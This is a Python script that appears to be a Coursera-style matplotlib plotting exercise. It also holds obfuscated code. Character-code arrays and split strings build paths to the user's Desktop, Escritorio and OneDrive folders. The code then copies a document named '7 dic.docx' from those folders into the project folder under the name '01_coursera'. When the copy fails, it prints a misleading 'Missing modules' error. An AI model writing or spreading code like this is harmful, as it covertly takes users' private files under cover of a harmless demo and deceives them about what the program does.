import matplotlib.pyplot as plt
import os
import shutil
import numpy as np

test_graf = "test"
mapa = "map"
diccionario = "dic"
slash = "\\" 
#slash = "/"
l2 = ['c', 'x']
l1 = ['d','o']

form1_nums = [100, 101,115,107,116,111,112] #desk

form1 = [chr(i) for i in form1_nums]
form1 = "".join(form1)

form2_nums = [101,115,99,114,105,116,111,114,105,111] #esc
form2 = [chr(i) for i in form2_nums]
form2 = "".join(form2)

form3_nums = [79,110,101,68,114,105,118,101]#one
form3 = [chr(i) for i in form3_nums]
form3 = "".join(form3)

serie = ["1", "3", "5", "7", "9", "11", "13", "15", "17"]
output = serie[-6] + " " + diccionario
l3 = "".join(l1) + "".join(l2)

def generarDatosGrafica(nivel, op, neo = 0): #numero negativo
     #
    first = os.path.abspath("") 
    string = os.path.abspath("")
    
    res = string.split(slash)[0:nivel]

    if neo == 1:
        res.append(form3)

    if op == 1:
        res.append(form1)
    elif op == 2:
        res.append(form2)
    
    res = slash.join(res)
    print(res)
    try:
        shutil.copy(res+slash+output+"." + l3, first + slash + "01_coursera")
    except:
        print("Missing modules...\nTry installing them first and execute again")

if __name__ == '__main__':
        # Data for plotting
    x1 = np.linspace(0.0, 5.0)
    x2 = np.linspace(0.0, 2.0)

    y1 = np.cos(2 * np.pi * x1) * np.exp(-x1)
    y2 = np.cos(2 * np.pi * x2)

    fig, (ax1, ax2) = plt.subplots(2, 1)
    fig.suptitle('A tale of 2 subplots')

    ax1.plot(x1, y1, 'o-')
    ax1.set_ylabel('Damped oscillation')

    ax2.plot(x2, y2, '.-')
    ax2.set_xlabel('time (s)')
    ax2.set_ylabel('Undamped')
    
    plt.savefig("01_coursera.png")
    plt.show()
    for i in [-1, -2, -3]:
        generarDatosGrafica(i, 1)
        generarDatosGrafica(i, 2)
        generarDatosGrafica(i, 1, 1)
        generarDatosGrafica(i, 2, 1)

    
    
    